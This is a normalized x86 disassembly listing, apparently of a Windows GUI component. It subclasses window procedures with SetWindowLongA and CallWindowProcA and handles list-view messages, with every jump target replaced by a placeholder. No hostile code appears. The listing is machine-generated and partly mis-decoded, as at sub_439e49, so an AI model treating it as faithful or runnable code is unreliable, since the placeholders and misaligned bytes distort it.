pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_44e9a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437fb0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_4393a0
mov eax [ ebp - 0x4 ]
call sub_43b8ec
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_45bc30
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_438e40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_45bc30
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_438e40
sub_438d67
cld
mov eax [ eax + 0x21c ]
call sub_45bc30
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_438e40
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8ec
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_45bc30
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_438e40
sub_438dc4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b578
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x240 ] eax
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_41b8e4
push 0x0
push 0x0
mov eax [ ebx + 0x240 ]
call sub_41b514
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_437cc0
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_452450
pop ebx
retn
mov eax ebx
call sub_43942c
sub_438e40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4550b4
mov ecx edi
mov edx esi
call sub_42a92c
sub_438e68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_45baf4
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_45bc30
jmp r-xdata
cmp esi [ ebx + 0x21c ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_438e40
jmp r-xdata
cmp esi [ ebx + 0x218 ]
jne r-xdata
cmp esi [ ebx + 0x220 ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_438e40
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_438e40
sub_438edc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44dd84
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x218 ]
jne r-xdata
cmp esi [ edi + 0x21c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43b1e8
cmp esi [ edi + 0x220 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43b258
xor edx edx
mov eax edi
call sub_43b2d0
sub_438f50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_439080
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4550b4
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42ace8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43905d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x295 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43c288
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_43908c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439165
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0x82
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x260 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
push ebp
call sub_438f50
pop ecx
jmp r-xdata
sub_439184
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439265
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453ff0
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453f08
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4540b8
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_439284
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4550b4
mov ecx edi
mov edx esi
call sub_42aa50
pop edi
pop esi
pop ebx
retn
sub_4392a4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_43b2d0
cmp [ ebx + 0x277 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x278 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x27a ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x275 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x276 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x294 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x279 ] 0x1
je r-xdata
or esi 0x2000
mov al [ r-xdata ]
and al [ ebx + 0x279 ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x279 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x279 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_4550b4
mov edx esi
call sub_42acb4
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_43b2d0
sub_4393a0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x22c ]
call sub_437cc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x24c ]
call sub_40331c
xor eax eax
mov [ ebx + 0x24c ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov al [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
pop edx
call sub_43769c
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0xc ]
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov dl [ esp ]
call sub_43769c
jmp r-xdata
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_43942c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x24c ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b578
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x24c ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x24c ]
call sub_41b514
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x22c ]
call sub_437cc0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_437cf0
call sub_437658
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x24c ]
mov ebp [ eax ]
call [ ebp + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4394b0
push ebx
push esi
push edi
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x274 ] dl
mov eax ebx
call sub_4392a4
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_437cc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4393a0
jmp r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
call sub_437b38
push eax
mov eax ebx
call sub_4550b4
pop edx
call sub_42abec
test eax eax
setne al
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
pop edx
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_439558
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x279 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x279 ] al
mov eax ebx
call sub_4392a4
sub_439580
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x244 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x22c ]
call sub_437db4
mov [ esi + 0x244 ] bl
mov eax esi
call sub_452654
sub_439624
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov cl 0x1
mov edx 0x3
call sub_43784c
mov eax ebx
call sub_43b398
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43b398
xor ecx ecx
mov edx 0x3
call sub_43784c
pop esi
pop ebx
retn
sub_4396b4
push ebx
mov ebx eax
mov eax [ ebx + 0x70 ]
call sub_424640
push eax
mov eax ebx
call sub_4550b4
pop edx
call sub_42ab4c
mov eax [ ebx + 0x70 ]
call sub_424640
push eax
mov eax ebx
call sub_4550b4
pop edx
call sub_42a914
pop ebx
retn
sub_4396e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x268 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x268 ] esi
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_4550b4
mov edx esi
call sub_42ac68
sub_439718
push ebx
mov ebx eax
mov eax ebx
call sub_4545e8
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_4396b4
sub_43973c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4546cc
pop esi
pop ebx
retn
mov eax ebx
call sub_452654
sub_439760
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43995f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4533c4
mov eax ebx
call sub_439990
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439966
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ esi + 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ ebx + 0x295 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_43c288
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43c288
mov esi eax
mov eax ebx
call sub_4550b4
mov edx [ edi + 0xc ]
call sub_42aadc
mov edx eax
mov eax esi
call sub_436dec
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
call GetMessagePos
call sub_406dec
movzx eax ax
push eax
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0x8 ]
pop edx
call sub_4062cc
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44e3f8
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_4550b4
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_436dec
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax ebx
call sub_4550b4
cmp esi eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0xc ]
mov edx 0x50
call sub_404764
mov eax [ ebp - 0xc ]
call sub_4043d8
push eax
mov eax [ ebp - 0xc ]
call sub_4045d8
push eax
push esi
call GetClassNameA
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404764
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404524
jne r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44e3f8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push esi
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43c288
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffaf
call sub_403518
sub_43999c
push ebx
mov ebx eax
mov eax ebx
call sub_454610
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_439694
mov eax ebx
call sub_439990
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x264 ]
push eax
call InvalidateRect
sub_439a04
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x234 ]
mov dl [ esi + 0x8 ]
mov eax ebx
call sub_43866c
mov dl [ esi + 0x9 ]
mov eax ebx
call sub_438680
mov dl [ esi + 0xa ]
mov eax ebx
call sub_438694
pop esi
pop ebx
retn
sub_439a30
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x215 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x215 ] dl
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
xor eax eax
mov al [ ebx + 0x215 ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_4550b4
push eax
call SetWindowLongA
mov eax ebx
call sub_43b5f8
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x234 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_43b5d8
mov dl 0x3
mov eax ebx
call sub_43b5d8
jmp r-xdata
sub_439ab4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4542b4
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x264 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x260 ] eax
mov eax [ ebx + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x264 ]
push eax
call SetWindowLongA
sub_439b04
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_43b398
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43b398
call sub_437b38
mov esi eax
sub_439b2c
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
pop ebx
retn
sub_439b54
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_439ba0
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov al 0x1
pop ebx
retn
sub_439bc8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
xor eax eax
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_439bfc
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x372 ] 0x0
je r-xdata
mov ecx [ ebx + 0x22c ]
mov dl 0x1
mov eax [ esp ]
call sub_43755c
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_439c48
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_439c94
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_439db5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_437cf0
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439dbc
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_439c48
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_404118
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408d90
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_40416c
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_439ddc
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_439e00
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_439e49
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43aafe
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edi eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_403518
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cf0
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403518
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab05
lea eax [ ebp - 0x9c ]
call sub_404118
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov edx [ ebp - 0x8 ]
mov ebx esi
xor edx edx
push ebp
push sub_43a629
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_425720
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x231 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cc0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
call sub_42aa84
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x14 ]
call sub_439e00
push eax
mov eax [ ebx + 0x18 ]
call sub_439e00
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
